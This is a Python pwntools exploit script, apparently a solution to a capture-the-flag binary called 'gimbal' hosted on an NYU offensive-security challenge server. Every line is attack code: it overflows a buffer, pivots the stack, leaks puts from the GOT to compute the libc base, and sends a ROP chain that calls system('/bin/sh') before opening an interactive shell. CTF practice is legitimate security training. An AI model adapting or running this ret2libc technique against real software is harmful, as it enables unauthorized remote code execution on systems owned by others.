from pwn import *
p = remote('offsec-chalbroker.osiris.cyber.nyu.edu',1344)

#p = process("./gimbal")
#context.log_level = "debug"

p.sendline("svv232")
p.recvuntil("...")
#pause()

e = ELF("libc-2.19.so")
system = e.symbols["system"]

pop_rsi = 0x0000000000400791 #1 more register
pop_rsp = 0x000000000040078d #3 more registers
pop_rdi = 0x0000000000400793
pop_rbp = 0x00000000004005d8
puts_call = 0x400520
puts_got = 0x601018

offset = 0x1ddd
payload = "A" * 0x20 
buffer_item = 0x601080 + offset 
binsh = 0x601080
payload += p64(buffer_item)
read_set_up = 0x40067d #0x40068e
r2_offset = 0x1000 

rop_chain2 = "".join(map(p64,[
    binsh + r2_offset,
    read_set_up,
]))

rop_chain = "/bin/sh\x00" + ("A" * (r2_offset - 8)) + rop_chain2 + ("A" * (offset - r2_offset - len(rop_chain2)))

rop_chain += "".join(map(p64,[
    buffer_item,
    pop_rdi,
    puts_got,
    puts_call,
    pop_rbp,
    0x602ea6,
    read_set_up,
]))

rop_chain += p64(0x4006b3) * 20 + p64(buffer_item - 0x20)

assert "\n" not in rop_chain

p.recvuntil("?")
p.sendline(rop_chain)
p.recvuntil("?")
p.send(payload)

p.recvline()
p.recvline()

puts_libc = p.recvline().strip()
puts_libc += "\x00"  * (8 - len(puts_libc))
puts_libc = u64(puts_libc)

offset = 0x6fd60
libc = puts_libc - offset

system += libc

print "puts in libc at ",hex(puts_libc)
print "libc at", hex(libc)
print "system in libc at",hex(system)

payload = "".join(map(p64,[
    pop_rdi,
    binsh,
    system
]))

payload += "\x00" * 0x8

new_rop = 0x602e75 - 0x8

payload += p64(new_rop)

p.send(payload)
print len(payload)

p.interactive()
